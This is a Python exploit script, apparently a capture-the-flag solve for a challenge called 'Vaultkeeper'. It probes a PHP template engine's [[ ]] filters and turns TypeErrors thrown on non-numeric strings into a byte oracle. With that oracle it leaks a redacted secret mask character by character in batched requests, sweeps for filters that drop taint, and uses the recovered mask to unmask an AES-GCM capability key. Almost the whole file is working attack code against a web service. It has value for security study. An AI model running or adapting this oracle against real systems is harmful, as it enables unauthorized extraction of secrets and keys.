#!/usr/bin/env python3
"""
Vaultkeeper stage C: leak cap.mask out of the DEPLOYED [[ ]] filter engine.

Angle: the taint flag is carried on the value and only consulted on the SUCCESS
path, so an exception inside the filter chain escapes as '' while a survivor
comes back as '[redacted]'. That single distinction is a byte oracle if any
filter can be made to throw as a function of the value.

The thrower: PHP 8 raises TypeError for arithmetic on a NON numeric string
("abc" * 1) but happily evaluates a leading numeric one ("5abc" * 1 == 5).
So if `mul` (or `sub`) doesn't cast its subject first:
    [[config.cap_mask|at:I|code|add:N|char|mul:1]]

  at:I    -> one character of the mask        (tainted)
  code    -> its ordinal, 48..122
  add:N   -> shift it
  char    -> chr(), so the value is a digit character iff code+N is in [48,57]
  mul:1   -> survives iff that character is a digit

  '[redacted]' == survived == code in [48-N, 57-N]      (a 10 wide window)
  ''          == threw

Nine values of N localise the code to a 10 wide window, ten more pin it
exactly. Everything is BATCHED: one template holds ~35 tokens, so the whole
16 character mask costs about 10 requests.

Validated offline against solve/mock_render2.php (a local reimplementation of
the deployed engine that reproduces every recorded live behaviour), with
negative controls: mode A (uncast mul) recovers the planted mask, mode B (cast
mul) and mode C (taint checked before the filters) both refuse to answer rather
than emitting a wrong mask.

    ctf-python probe_taint.py --base http://<host> --chars
    ctf-python probe_taint.py --base http://<host> --extract
    ctf-python probe_taint.py --base http://<host> --all
"""
import argparse
import json
import os
import re
import string
import sys
import time

import requests

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(os.path.dirname(HERE), "artifacts", "probe_taint")
os.makedirs(OUT, exist_ok=True)

S = requests.Session()
ALNUM = string.ascii_letters + string.digits
MARK = re.compile(r"~(\d+)~(.*?)(?=~\d+~|$)", re.S)
STATE = {"base": "", "path": "/api/render_template.php", "event": "maintenance.x",
         "cap": 1900, "sleep": 0.35, "requests": 0, "sel": "at:%d"}


def save(name, obj):
    with open(os.path.join(OUT, name), "w") as f:
        json.dump(obj, f, indent=1)


def post(tpl, tries=4):
    """One render request. Returns the rendered string, or None on a hard error."""
    url = STATE["base"] + STATE["path"]
    for n in range(tries):
        try:
            r = S.post(url, json={"template": tpl, "event": STATE["event"]}, timeout=30)
            STATE["requests"] += 1
            if r.status_code == 500:
                return "<500>"
            return r.json().get("rendered")
        except Exception as e:
            if n == tries - 1:
                print("    [!] request failed: %s" % e, file=sys.stderr)
                return None
            time.sleep(2 + 2 * n)
    return None


def render_batch(tokens):
    """tokens: list of template fragments. Returns a list of rendered outputs.

    Packs as many as fit under the 2000 char template cap into one request and
    recovers each answer by its ~N~ marker. Missing answers are retried once in
    smaller chunks, so a truncated template never silently drops a result.
    """
    out = [None] * len(tokens)
    todo = list(range(len(tokens)))
    for attempt in range(3):
        if not todo:
            break
        chunks, cur, ln = [], [], 0
        for i in todo:
            piece = "~%d~%s" % (i, tokens[i])
            if ln + len(piece) > STATE["cap"] // (1, 4, 12)[attempt] and cur:
                chunks.append(cur)
                cur, ln = [], 0
            cur.append(i)
            ln += len(piece)
        if cur:
            chunks.append(cur)
        for ch in chunks:
            tpl = "".join("~%d~%s" % (i, tokens[i]) for i in ch)
            got = post(tpl)
            if got is None:
                time.sleep(3)
                continue
            for m in MARK.finditer(got):
                idx = int(m.group(1))
                if idx in ch:
                    out[idx] = m.group(2)
            time.sleep(STATE["sleep"])
        todo = [i for i in todo if out[i] is None]
    return out


# ---------------------------------------------------------------- stage 1
MASK = "config.cap_mask"


def characterize():
    """One batched pass that settles every open question about the engine.

    Returns a dict of answers plus the chosen thrower filter, or None if no
    filter in the deployed set can be made to throw.
    """
    t = {}
    # ORDER OF THE PIPELINE. If an unknown filter on a tainted subject echoes
    # the token, the engine consults the taint AFTER the filter loop, which is what
    # makes an in-chain exception observable at all. '[redacted]' here means
    # the taint short circuits before the filters and this whole angle is dead.
    t["order.unknown_on_mask"] = "[[%s|zzz]]" % MASK
    t["order.unknown_after"] = "[[%s|upper|zzz]]" % MASK
    t["order.unknown_on_node"] = "[[node|zzz]]"
    t["order.empty_filter"] = "[[%s||upper]]" % MASK

    # THE THROWER. PHP 8: "x" * 2 is a TypeError, (int)"x" * 2 is 0. A filter
    # that casts can never throw; one that doesn't is the byte oracle. The
    # trailing |add:7 is a survival beacon: '7' means the chain lived, '' means
    # something in it threw.
    for f in ("mul", "sub", "add"):
        t["throw.%s.nonnum" % f] = "[['x'|%s:2|add:7]]" % f
        t["throw.%s.leadnum" % f] = "[['5x'|%s:2]]" % f
        t["throw.%s.num" % f] = "[['5'|%s:2]]" % f
        t["throw.%s.noarg" % f] = "[['5'|%s]]" % f
    # THE GENERAL DISCRIMINATOR. Any filter that throws on a non numeric string
    # but not on a digit is a usable thrower, whatever the reason: an uncast
    # arithmetic operator, or an int type hint (PHP coercive mode raises
    # TypeError when a non numeric string is passed to an int parameter).
    for f, arg in (("upper", ""), ("lower", ""), ("len", ""), ("trim", ""),
                   ("slice", ":0"), ("sub", ":0"), ("at", ":0"), ("char", ""),
                   ("mul", ":1"), ("add", ":0"), ("code", "")):
        t["disc.%s.x" % f] = "[['x'|%s%s|add:7]]" % (f, arg)
        t["disc.%s.d" % f] = "[['5'|%s%s|add:7]]" % (f, arg)

    # config.version is '4.2.1', a LEADING numeric string. Uncast arithmetic
    # yields 4.2 with a warning, a cast yields 4. This separates cast from
    # uncast without needing anything to throw.
    t["cast.version_mul"] = "[[config.version|mul:1]]"
    t["cast.version_add"] = "[[config.version|add:0]]"
    t["cast.version_sub"] = "[[config.version|sub:0]]"
    t["cast.node_mul"] = "[[node|mul:2]]"
    t["cast.node_sub"] = "[[node|sub:2]]"
    t["cross.mask_digit0"] = "[[%s|slice:0|mul:1]]" % MASK
    t["cross.mask_digit1"] = "[[%s|slice:1|mul:1]]" % MASK
    t["cross.mask_roundtrip"] = "[[%s|at:0|code|char]]" % MASK
    t["misc.bracket"] = "[['A'|code|add:26|char]]"

    t["throw.at.oob"] = "[[node|at:99|add:7]]"
    t["throw.at.negoob"] = "[[node|at:-99|add:7]]"
    t["throw.slice.oob"] = "[[node|slice:99|add:7]]"
    t["throw.slice.neglen"] = "[[node|slice:0:-99|add:7]]"
    t["throw.slice.3arg"] = "[[node|slice:1:2:3|add:7]]"
    t["throw.len.arg"] = "[[node|len:9|add:7]]"
    t["throw.char.big"] = "[['99999'|char|add:7]]"
    t["throw.code.empty"] = "[['' |code|add:7]]"
    t["throw.chain10"] = "[[node|upper|lower|upper|lower|upper|lower|upper|lower|upper|lower]]"

    # SEMANTICS still unrecorded.
    t["sem.sub"] = "[['hello'|sub:1]]"
    t["sem.sub2"] = "[['hello'|sub:1:2]]"
    t["sem.code"] = "[[node|code]]"
    t["sem.negarg"] = "[[node|add:-5]]"
    t["sem.at_then_code"] = "[[node|at:0|code]]"
    t["sem.code_char"] = "[[node|at:0|code|add:1|char]]"
    t["sem.digitchar"] = "[['A'|code|add:-17|char]]"

    # THE ORACLE ITSELF, on a subject whose answer is already known. If
    # oracle.control_hit is '5' and oracle.control_miss is '' the mechanism
    # works end to end on untainted data.
    t["oracle.control_hit"] = "[['A'|code|add:-17|char|mul:1|add:0]]"
    t["oracle.control_miss"] = "[['A'|code|add:0|char|mul:1|add:0]]"
    t["oracle.mask_p0_n9"] = "[[%s|at:0|code|add:9|char|mul:1]]" % MASK
    t["oracle.mask_p0_nm1"] = "[[%s|at:0|code|add:-1|char|mul:1]]" % MASK

    # TAINT BY A DIFFERENT PATH SPELLING. The handout keys the taint on the
    # resolved VALUE, exact match for a scalar and substring for an array. Any
    # spelling that reaches into the string, or that resolves to a value which
    # merely contains the mask, escapes an exact match.
    for i, p in enumerate(["%s.0", "%s.1", "%s.15", "%s.0.0"]):
        t["path.index%d" % i] = "[[%s]]" % (p % MASK)
    t["path.index_len"] = "[[%s.0|len]]" % MASK
    t["path.upper"] = "[[config.CAP_MASK]]"
    t["path.space_in"] = "[[config. cap_mask]]"
    t["path.space_around"] = "[[ config . cap_mask ]]"
    t["path.double_dot"] = "[[config..cap_mask]]"
    t["path.trail_dot"] = "[[%s.]]" % MASK
    t["path.trail_sp"] = "[[%s ]]" % MASK
    t["path.bare"] = "[[cap_mask]]"
    t["path.config"] = "[[config]]"
    t["path.config_len"] = "[[config|len]]"
    t["path.config_at"] = "[[config|at:0]]"
    t["path.config_slice"] = "[[config|slice:0:20]]"

    # ARGUMENTS AS CONTEXT PATHS. 30 rather than 0 means arguments resolve, and
    # then the mask can ride in argument position where the subject's taint
    # flag doesn't reach.
    t["arg.path_add"] = "[[node|add:config.retention_days]]"
    t["arg.path_at"] = "[['0123456789abcdef'|at:config.retention_days]]"
    t["arg.mask_add"] = "[[node|add:%s]]" % MASK
    t["arg.mask_at"] = "[['0123456789abcdef'|at:%s]]" % MASK
    t["arg.quoted"] = "[[node|at:'1']]"

    keys = list(t)
    vals = render_batch([t[k] for k in keys])
    ans = dict(zip(keys, vals))
    save("characterize.json", ans)
    for k in keys:
        print("  %-24s %-52s -> %r" % (k, t[k], ans[k]))

    # decide
    if ans.get("order.unknown_on_mask") != "[[%s|zzz]]" % MASK:
        print("\n[!] taint short circuits BEFORE the filter loop: no in chain oracle.")
    # A thrower is any filter that dies on a non numeric string and survives on
    # a digit. That's exactly the predicate the byte oracle needs.
    throwers = []
    for f, arg in (("mul", ":1"), ("sub", ":0"), ("char", ""), ("code", ""),
                   ("at", ":0"), ("slice", ":0"), ("len", ""), ("add", ":0"),
                   ("upper", ""), ("lower", ""), ("trim", "")):
        if ans.get("disc.%s.x" % f) == "" and ans.get("disc.%s.d" % f) not in ("", None):
            throwers.append(f + arg)
    if ans.get("oracle.control_hit") not in ("", None) and ans.get("oracle.control_miss") == "":
        print("\n[+] ORACLE LIVE end to end on untainted data (mul route).")
        if "mul:1" not in throwers:
            throwers.insert(0, "mul:1")
    print("\n[=] throwers found: %s" % throwers)
    return ans, (throwers[0] if throwers else None)


# ---------------------------------------------------------------- stage 2
WINDOW_N = [9, -1, -11, -21, -31, -41, -51, -61, -71]   # covers ord 39..128


def tok(pos, n, thrower):
    return "[[%s|%s|code|add:%d|char|%s]]" % (MASK, STATE["sel"] % pos, n, thrower)


def is_hit(v):
    return v is not None and v not in ("", "<500>") and "[[" not in v


def extract(thrower="mul:1", length=16):
    """Two batched rounds recover every byte. Round 1 localises each ordinal to
    a 10 wide window, round 2 sweeps that window and reads the boundary."""
    print("[*] round 1: %d tokens" % (length * len(WINDOW_N)))
    idx, toks = [], []
    for p in range(length):
        for n in WINDOW_N:
            idx.append((p, n))
            toks.append(tok(p, n, thrower))
    r1 = render_batch(toks)
    save("round1.json", [[p, n, v] for (p, n), v in zip(idx, r1)])
    win = {}
    for (p, n), v in zip(idx, r1):
        if is_hit(v):
            win.setdefault(p, []).append(n)
    for p in range(length):
        print("    pos %2d window hits %s" % (p, win.get(p)))
    bad = [p for p in range(length) if len(win.get(p, [])) != 1]
    if bad:
        print("[!] positions with an ambiguous window: %s" % bad)
    lost = sum(1 for v in r1 if v is None)
    if lost:
        print("[!] %d round 1 answers never came back, re run those positions" % lost)

    print("[*] round 2: sweeping each window")
    idx2, toks2 = [], []
    for p in range(length):
        if len(win.get(p, [])) != 1:
            continue
        n0 = win[p][0]
        for n in range(n0 - 9, n0 + 10):
            idx2.append((p, n))
            toks2.append(tok(p, n, thrower))
    r2 = render_batch(toks2)
    save("round2.json", [[p, n, v] for (p, n), v in zip(idx2, r2)])
    hits = {}
    for (p, n), v in zip(idx2, r2):
        if is_hit(v):
            hits.setdefault(p, []).append(n)

    mask = []
    for p in range(length):
        h = sorted(hits.get(p, []))
        if not h or len(h) != 10 or h[-1] - h[0] != 9:
            print("    pos %2d INCONSISTENT hits=%s" % (p, h))
            mask.append("?")
            continue
        code = 57 - h[-1]
        c = chr(code) if 32 <= code < 127 else "?"
        print("    pos %2d ord=%d %r" % (p, code, c))
        mask.append(c)
    m = "".join(mask)
    print("\n[=] cap.mask = %r  (requests used: %d)" % (m, STATE["requests"]))
    save("mask.json", {"mask": m})
    if "?" not in m and all(c in ALNUM for c in m):
        print("[+] 16 alnum characters, shape is right.")
        print("[>] NEXT: ctf-python solve.py --base %s --redir <tunnel> --mask '%s'"
              % (STATE["base"], m))
    return m


# ---------------------------------------------------------------- verify
def verify(mask, masked_b64):
    """Offline check: cap_key = b64d(cap_key_masked) XOR mask must decrypt the
    read_capability from /api/status.php to exactly 'viewer          '."""
    import base64
    try:
        from Crypto.Cipher import AES
    except ImportError:
        print("[!] pycryptodome missing, skipping the GCM check")
        return None
    key = bytes(a ^ b for a, b in zip(base64.b64decode(masked_b64), mask.encode()))
    r = S.get(STATE["base"] + "/api/status.php", timeout=30).json()
    raw = base64.b64decode(r["read_capability"])
    try:
        pt = AES.new(key, AES.MODE_GCM, nonce=raw[:12]).decrypt_and_verify(raw[12:28], raw[28:44])
    except Exception as e:
        print("[!] GCM check FAILED: %s" % e)
        return False
    print("[+] GCM check PASSED, plaintext %r, cap_key %r" % (pt, key))
    return pt == b"viewer          "


# ---------------------------------------------------------------- filters
EXTRA_FILTERS = """
raw safe trusted untaint notaint plain clear reveal show unmask unredact expose
get pick var val ctx lookup resolve ref deref path field key prop attr fetch
copy clone id ident echo print out emit str s n i c v x y z of as with
json b64 hex bin oct md5 sha1 sha256 hash crc dump repr export serialize
rev reverse rot rot13 shuffle sort uniq split chunk words join cat concat
first last head tail take drop skip limit init rest cut crop clip left right
pad padl padr fill rep repeat dup times star scale div idiv mod rem quo
abs sign round floor ceil sqrt pow exp log inc dec neg not inv flip
eq ne gt lt ge le cmp same equals contains starts ends match test like re
default fallback coalesce ifnull nvl empty blank nil null zero one
ucfirst lcfirst title capitalize swapcase strip lstrip rstrip squeeze
date time fmt format sprintf printf number nformat money bytes
esc escape e html url urlenc rawurl attr2 quote unquote
""".split()


def filter_sweep(names=None):
    """Unknown filter echoes the whole token, so a name whose output differs is
    real. Test on the MASK directly: '[redacted]' is a real filter that carries
    the taint, an echo is an unknown name, and ANYTHING ELSE is a filter that
    drops the taint, which wins outright."""
    names = names or sorted(set(EXTRA_FILTERS))
    toks = ["[[%s|%s]]" % (MASK, n) for n in names]
    res = render_batch(toks)
    real, gold = {}, {}
    for n, v in zip(names, res):
        if v is None:
            continue
        if v == "[[%s|%s]]" % (MASK, n):
            continue
        if v == "[redacted]":
            real[n] = v
        else:
            gold[n] = v
            print("    *** %-12s -> %r  TAINT DROPPED" % (n, v))
    print("[=] known filters that carry the taint: %s" % sorted(real))
    save("filters.json", {"carry": real, "drop": gold})
    return real, gold


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True)
    ap.add_argument("--path", default="/api/render_template.php")
    ap.add_argument("--event", default="maintenance.x")
    ap.add_argument("--chars", action="store_true")
    ap.add_argument("--filters", action="store_true")
    ap.add_argument("--extract", action="store_true")
    ap.add_argument("--all", action="store_true")
    ap.add_argument("--fast", action="store_true",
                    help="characterize then extract, ~14 requests, no filter sweep")
    ap.add_argument("--thrower", default=None)
    ap.add_argument("--masked", default=None, help="cap_key_masked b64, for the offline check")
    ap.add_argument("--sel", default="at:%d",
                    help="character selector, fallback 'slice:%%d:1' if at behaves oddly")
    ap.add_argument("--sleep", type=float, default=0.35)
    ap.add_argument("--cap", type=int, default=1900)
    a = ap.parse_args()
    STATE.update(base=a.base.rstrip("/"), path=a.path, event=a.event,
                 sleep=a.sleep, cap=a.cap, sel=a.sel)

    thrower = a.thrower
    if a.chars or a.all or a.fast:
        _, guess = characterize()
        thrower = thrower or guess
    if a.filters or a.all:
        filter_sweep()
    if a.extract or a.all or a.fast:
        if not thrower:
            print("[!] no thrower filter, extraction cannot run")
            return 2
        m = extract(thrower)
        if a.masked and "?" not in m:
            verify(m, a.masked)
    print("[=] total requests: %d" % STATE["requests"])
    return 0


if __name__ == "__main__":
    sys.exit(main())
